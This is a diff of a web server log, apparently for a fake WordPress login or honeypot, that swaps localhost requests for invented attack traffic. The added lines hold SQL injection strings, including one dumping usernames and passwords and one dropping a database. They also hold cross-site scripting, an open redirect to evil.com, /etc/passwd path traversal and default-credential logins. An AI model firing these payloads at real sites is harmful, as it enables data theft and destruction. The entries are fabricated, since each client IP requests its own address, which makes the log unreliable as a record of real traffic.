@@ -1,16 +1,16 @@
-2025-04-25 13:16:52,441 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1/ | Args: {}
-2025-04-26 00:57:28,420 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8080/ | Args: {}
-2025-04-26 00:57:28,563 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8080/favicon.ico | Args: {}
-2025-04-26 00:57:32,996 Client 127.0.0.1 | Method: POST | URL: http://127.0.0.1:8080/wp-admin-login | Args: {}
-2025-04-26 01:02:04,709 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8080/ | Args: {}
-2025-04-26 01:02:15,931 Client 127.0.0.1 | Method: POST | URL: http://127.0.0.1:8080/wp-admin-login | Args: {}
-2025-04-26 12:51:14,764 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/ | Args: {}
-2025-04-26 12:51:14,803 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
-2025-04-26 12:51:17,107 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/ | Args: {}
-2025-04-26 12:51:17,140 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
-2025-04-26 12:52:40,866 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/ | Args: {}
-2025-04-26 12:52:40,898 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
-2025-04-26 12:52:41,510 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/ | Args: {}
-2025-04-26 12:52:41,545 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
-2025-04-26 12:52:41,670 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/ | Args: {}
-2025-04-26 12:52:41,697 Client 127.0.0.1 | Method: GET | URL: http://127.0.0.1:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
+2025-04-25 13:16:52,441 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211/?id=1' OR '1'='1 | Args: {id: "1' OR '1'='1"}
+2025-04-26 00:57:28,420 Client 201.33.85.77 | Method: GET | URL: http://201.33.85.77:8080/?page=home'; DROP DATABASE; -- | Args: {page: "home'; DROP DATABASE; --"}
+2025-04-26 00:57:28,563 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211:8080/favicon.ico | Args: {}
+2025-04-26 00:57:32,996 Client 201.33.85.77 | Method: POST | URL: http://201.33.85.77:8080/wp-admin-login | Args: {username: 'admin', password: 'password'}
+2025-04-26 01:02:04,709 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211:8080/?redirect=http://evil.com | Args: {redirect: "http://evil.com"}
+2025-04-26 01:02:15,931 Client 201.33.85.77 | Method: POST | URL: http://201.33.85.77:8080/wp-admin-login | Args: {username: 'admin', password: 'password'}
+2025-04-26 12:51:14,764 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211:8888/ | Args: {cmd: "ls -la"}
+2025-04-26 12:51:14,803 Client 201.33.85.77 | Method: GET | URL: http://201.33.85.77:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
+2025-04-26 12:51:17,107 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211:8888/?search=<script>alert('xss')</script> | Args: {search: "<script>alert('xss')</script>"}
+2025-04-26 12:51:17,140 Client 201.33.85.77 | Method: GET | URL: http://201.33.85.77:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
+2025-04-26 12:52:40,866 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211:8888/ | Args: {file=../../../../../../../etc/passwd}
+2025-04-26 12:52:40,898 Client 201.33.85.77 | Method: GET | URL: http://201.33.85.77:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
+2025-04-26 12:52:41,510 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211:8888/?id=2 UNION SELECT null, username, password FROM users -- | Args: {id: "2 UNION SELECT null, username, password FROM users --"}
+2025-04-26 12:52:41,545 Client 201.33.85.77 | Method: GET | URL: http://201.33.85.77:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
+2025-04-26 12:52:41,670 Client 45.76.123.211 | Method: GET | URL: http://45.76.123.211:8888/?lang=../../../../../../etc/passwd | Args: {lang: "../../../../../../etc/passwd"}
+2025-04-26 12:52:41,697 Client 201.33.85.77 | Method: GET | URL: http://201.33.85.77:8888/assets/images/wordpress-logo-wordpress-icon-transparent-free-png.png | Args: {}
